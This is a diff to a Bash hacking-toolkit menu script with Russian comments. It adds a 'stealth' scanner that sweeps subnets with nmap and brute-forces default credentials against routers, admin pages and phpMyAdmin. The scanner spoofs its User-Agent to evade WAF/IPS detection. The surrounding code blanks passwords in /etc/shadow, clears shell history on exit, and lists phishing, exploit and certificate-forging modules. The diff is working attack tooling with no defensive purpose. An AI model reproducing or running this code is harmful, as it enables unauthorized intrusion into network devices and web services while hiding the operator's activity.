@@ -1015,6 +1015,85 @@ run_router_scan() {
 }
 
 
+generate_prime_router_scan_v2() {
+    local target_file="$1"
+    local code=$(cat << 'EOF'
+#!/bin/bash
+# PRIME_HEURISTIC_SCANNER (Advanced Stealth Edition)
+
+TARGET="$1"
+# Рандомизация User-Agent для обхода простых WAF/IPS
+UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
+
+echo "--------------------------------------------------"
+echo -e "\e[1;32m>> INITIATING HEURISTIC ANALYSIS: $TARGET\e[0m"
+echo "--------------------------------------------------"
+
+# Эвристическая функция проверки доступа
+check_access() {
+    local user=$1
+    local pass=$2
+    local url=$3
+    # Используем -L для редиректов и -sS для тишины
+    local res=$(curl -sL -u "$user:$pass" -A "$UA" --max-time 3 -o /dev/null -w "%{http_code}" "$url")
+    
+    if [[ "$res" == "200" ]]; then
+        echo -e "    \e[1;32m[!] SUCCESS: $user:$pass\e[0m (Found on $url)"
+        return 0
+    fi
+    return 1
+}
+
+# Список критических путей (от роутеров до админок сайтов и DB-веб-интерфейсов)
+PATHS=("/" "/admin" "/config.php" "/phpmyadmin" "/setup.cgi" "/wizard.html" "/get_set.cgi")
+# Минимальный набор самых эффективных пар (Эвристический топ)
+CREDS=("admin:admin" "admin:password" "root:root" "admin:" "admin:1234" "root:12345")
+
+for path in "${PATHS[@]}"; do
+    URL="http://$TARGET$path"
+    # Быстрая проверка существования пути
+    if [[ $(curl -s -o /dev/null -w "%{http_code}" -A "$UA" --max-time 2 "$URL") != "404" ]]; then
+        echo -e "\e[1;34m[*] Testing entry point: $path\e[0m"
+        for pair in "${CREDS[@]}"; do
+            IFS=':' read -r u p <<< "$pair"
+            check_access "$u" "$p" "$URL" && break 2 # Если нашли, выходим из циклов для этой цели
+            sleep 0.2 # Задержка для скрытности (Stealth)
+        done
+    fi
+done
+
+echo "--------------------------------------------------"
+EOF
+)
+    smart_cat "$target_file" "$code"
+    chmod +x "$target_file"
+}
+
+run_heuristic_router_scan() {
+    clear
+    echo -e "\e[1;32m[ PRIME HEURISTIC SCANNER v2 ]\e[0m"
+    echo -e "Target types: IP Range, Single IP, Domain, DB-Uplink\n"
+    
+    read -p "ENTER TARGET: " H_TARGET
+    
+    # Проверка: если введена сеть (например /24), используем nmap для поиска живых
+    if [[ "$H_TARGET" == */* ]]; then
+        echo -e "\e[1;34m[*] Detecting active nodes in $H_TARGET...\e[0m"
+        NODES=$(nmap -n -sn "$H_TARGET" | grep "for" | awk '{print $5}')
+        for node in $NODES; do
+            echo -e "\n\e[1;33m[ ANALYSIS: $node ]\e[0m"
+            prime-hscan "$node"
+        done
+    else
+        # Одиночная цель
+        prime-hscan "$H_TARGET"
+    fi
+    
+    echo -e "\n\e[1;33mPRESS ENTER TO RETURN...\e[0m"
+    read
+}
+
+
 reset_linux_pass() { read -p "User: " u; sed -i "s/^$u:[^:]*:/$u::/" /etc/shadow; pause; }
 reset_macos_info() { echo "dscl . -passwd /Users/username newpassword"; pause; }
 
@@ -1064,10 +1143,10 @@ exit_script() { history -c; exit 0; }
 # --- ГЛАВНОЕ МЕНЮ (v31.3: + SEC_TOOLS) ---
 run_main_menu() {
     # 1. Список имен
-    local main_names="GHOST_SCAN SOCIAL_ENG SQLMAP SMART_OSINT DEVICE_HACK EXPLOIT_HUB AIO_OSINT_AUTO IBAN/RIB_SCAN MANUAL_INSTALL REPAIR UPDATE_CORE SERVICE_HUB PWD_GEN CERT_FORGE SYSTEM_INFO CERTIF_READER ROUTER_SCAN EXIT"
+    local main_names="GHOST_SCAN SOCIAL_ENG SQLMAP SMART_OSINT DEVICE_HACK EXPLOIT_HUB AIO_OSINT_AUTO IBAN/RIB_SCAN MANUAL_INSTALL REPAIR UPDATE_CORE SERVICE_HUB PWD_GEN CERT_FORGE SYSTEM_INFO CERTIF_READER HEURESTIC_ROUTER_SCAN EXIT"
     
     # 2. Список функций
-    local main_funcs="run_ghost_scan run_phishing run_sqlmap run_osint run_device_hack run_exploit_hub run_osint2 run_iban_scan install_manual_tools run_repair update_prime run_servers run_pwd_gen run_cert_forge run_system_info run_cert_reader run_router_scan exit_script"
+    local main_funcs="run_ghost_scan run_phishing run_sqlmap run_osint run_device_hack run_exploit_hub run_osint2 run_iban_scan install_manual_tools run_repair update_prime run_servers run_pwd_gen run_cert_forge run_system_info run_cert_reader run_heuristic_router_scan exit_script"
     
     prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
 }
